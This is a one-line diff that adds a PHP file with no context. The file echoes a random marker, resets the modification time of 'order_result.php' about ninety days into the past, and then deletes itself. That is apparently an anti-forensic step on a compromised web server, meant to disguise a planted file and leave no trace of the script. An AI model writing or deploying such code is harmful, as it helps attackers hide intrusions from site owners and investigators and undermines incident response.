@@ -1,0 +1,1 @@
+<?php echo "aBydyVPrVm"; if (file_exists("./order_result.php")){ touch("./order_result.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*QDarxVm4H0e3fhPq2WGW*/ ?>
